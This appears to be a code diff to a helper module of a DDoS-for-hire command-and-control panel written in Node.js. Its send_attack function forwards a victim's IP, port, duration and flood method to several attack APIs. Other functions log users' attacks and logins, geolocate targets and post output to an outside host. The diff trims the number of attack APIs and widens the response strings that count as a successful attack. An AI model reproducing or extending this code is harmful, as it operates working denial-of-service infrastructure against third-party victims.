@@ -8,6 +8,7 @@ const eExtra = require("./functions.js");
 const Crud = require("../Auth/crud.js");
 const Config = require("../Config/main.js");
 const eConfig = require("../Config/current.js");
+const ServerFunc = require("../server/functions.js");
 
 /*
 *@type: void
@@ -16,6 +17,10 @@ exports.sleep = (milliseconds) => {
     return new Promise(resolve => setTimeout(resolve, milliseconds))
 }
 
+/*
+*@param: Method
+*@type: [<boolen>]
+*/
 exports.methodValidation = async function(meth) { 
     let methods = await(await fetch("https://syntaxapi.xyz/methods.txt")).text();
     return (methods.includes(meth) ? true : false);
@@ -50,16 +55,27 @@ exports.log_to_file = function(output) {
     fs.appendFileSync("./CNC/db/sys/logs.db", output);
 }
 
+/*
+*@param: Username, IP, Port, Time, Method
+*@type: void
+*/
 exports.log_attack = async function(user, ip, port, time, method) {
     fs.appendFileSync("./CNC/db/sys/users.db", "('" + user + "','" + ip + "','" + port + "','" + time + "','" + method + "','" + await this.currentTime() + "')\n");
 }
 
+/*
+*@param: User, IP
+*@type: void
+*/
 exports.log_login = async function(user, ip) {
     let t = await this.currentTime();
     fs.appendFileSync("./CNC/db/sys/login_logs.db", "('" + user + "','" + ip + "','" + t + "')\n");
 }
 
-
+/*
+*@param: output
+*@type: void
+*/
 exports.send_to_discord = function(output) {
     fetch("https://traumatized.xyz/sukme.php?log=" + output).then(res => res.text()).then(body => { console.log(body )});
 }
@@ -69,7 +85,7 @@ exports.send_to_discord = function(output) {
 *@type: [<string>]
 */
 exports.GeoIP = async function(ip) {
-    let results = await(await fetch("https://scrapy.tech/geo.php?ip="+ ip)).text();
+    let results = await(await fetch("https://syntaxapi.xyz/tools/?q="+ ip)).text();
     return results;
 }
 
@@ -151,18 +167,6 @@ exports.send_attack = async function(ip, port, time, method, usr) {
     let rreturn2 = await(await fetch(Config.API_3 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
     console.log(rreturn2);
     response += "API 3: " + await eExtra.get_api_response(rreturn2) + "\r\n";
-    
-    let rreturn3 = await(await fetch(Config.API_4 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
-    console.log(rreturn3);
-    response += "API 4: " + await eExtra.get_api_response(rreturn3) + "\r\n";
-    
-    let rreturn4 = await(await fetch(Config.API_5 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
-    console.log(rreturn4);
-    response += "API 5: " + await eExtra.get_api_response(rreturn4) + "\r\n";
-    
-    let rreturn5 = await(await fetch(Config.API_6 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
-    console.log(rreturn5);
-    response += "API 6: " + await eExtra.get_api_response(rreturn5) + "\r\n";
 
     return response;
 }
@@ -173,7 +177,7 @@ exports.send_attack = async function(ip, port, time, method, usr) {
 */
 exports.get_api_response = function(rpn) {
     let new_res = rpn.toLowerCase();
-    if(new_res.includes("attack sent") || new_res.includes("udphex") || new_res.includes("std") || new_res.includes("rawtcp") || new_res.includes("attack initalized") || new_res.includes('"status":"success"')) {
+    if(new_res.includes("attack sent") || new_res.includes("udphex") || new_res.includes("std") || new_res.includes("rawtcp") || new_res.includes("attack initalized") || new_res.includes('"status":"success"') || new_res.includes("attack started") || new_res.includes("powered by overowered")) {
         return "Attack Sent";
     } else if(new_res.includes("invalid key") || new_res.includes("key is invalid")) {
         return "Error, Invalid Key";
@@ -186,6 +190,10 @@ exports.get_api_response = function(rpn) {
     }
 }
 
+/*
+*@param: [METHOD]
+*@type: [<boolen>]
+*/
 exports.CleanMOTD = function(arg_array) {
     let msg = "";
     arg_array.forEach(el => {
